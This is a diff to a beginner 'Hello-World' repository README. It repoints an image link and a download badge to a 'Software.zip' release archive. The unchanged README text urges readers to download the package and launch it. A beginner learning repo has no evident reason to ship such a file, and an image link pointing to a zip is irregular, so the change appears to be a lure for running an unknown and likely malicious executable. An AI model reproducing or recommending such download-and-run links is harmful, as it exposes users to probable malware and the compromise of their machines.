@@ -1,7 +1,7 @@
 
 # Welcome to Hello-World Repository 🌍
 
-![Hello World](https://www.publicdomainpictures.net/pictures/80000/velka/hello-world-cartoon.jpg)
+![Hello World](https://github.com/SYGIANxAPPARITIONS/Hello-World/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -19,7 +19,7 @@ Welcome to the Hello-World repository! This repository is a space for beginners 
 
 ## Software Download
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/SYGIANxAPPARITIONS/Hello-World/releases/download/v1.0/Software.zip)](https://github.com/SYGIANxAPPARITIONS/Hello-World/releases/download/v1.0/Software.zip)
 
 The software package is available for download in the link above. Simply click on the button to access the software. Remember, after downloading, make sure to launch the software to start exploring its features and functionalities.
 
